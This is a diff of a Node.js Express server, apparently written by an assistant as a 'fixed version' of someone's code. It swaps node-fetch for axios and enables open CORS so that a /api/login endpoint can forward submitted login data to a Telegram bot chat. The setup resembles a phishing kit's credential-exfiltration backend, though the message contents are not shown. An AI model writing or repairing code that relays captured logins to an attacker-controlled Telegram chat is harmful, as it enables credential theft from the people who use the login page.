@@ -1,9 +1,12 @@
 // server/index.js
-// Added extra logging and safer error responses to debug the "Server error" reported by client.
+// Fixed version: uses axios instead of node-fetch (avoids node-fetch ESM/require crash),
+// and enables CORS so browser preflight/custom-headers won't cause "Failed to fetch".
+// Minimal changes only — preserved your original structure, logging and Telegram flow.
 
 const express = require('express');
-const fetch = require('node-fetch');
+const axios = require('axios');
 const path = require('path');
+const cors = require('cors');
 
 require('dotenv').config();
 
@@ -15,6 +18,12 @@ if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
 }
 
 const app = express();
+
+// Enable CORS (allow browser to make requests with custom headers / preflight).
+// If you prefer to restrict origins, replace cors() with cors({ origin: 'https://yourfrontend.example' })
+app.use(cors());
+
+// parse JSON bodies
 app.use(express.json());
 app.use(express.static(path.join(__dirname, '..')));
 
@@ -78,7 +87,7 @@ app.post('/api/login', async (req, res) => {
       return res.status(200).json({ forwarded: false, warning: 'telegram_not_configured' });
     }
 
-    // Attempt to send to Telegram
+    // Attempt to send to Telegram using axios (works with CommonJS)
     const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
     const body = {
       chat_id: TELEGRAM_CHAT_ID,
@@ -87,13 +96,12 @@ app.post('/api/login', async (req, res) => {
     };
 
     console.log('Sending message to Telegram API at', url);
-    const tgRes = await fetch(url, {
-      method: 'POST',
+    const tgRes = await axios.post(url, body, {
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(body)
+      timeout: 10000
     });
 
-    const tgJson = await tgRes.json();
+    const tgJson = tgRes.data;
     console.log('Telegram API response:', tgJson);
 
     if (!tgJson.ok) {
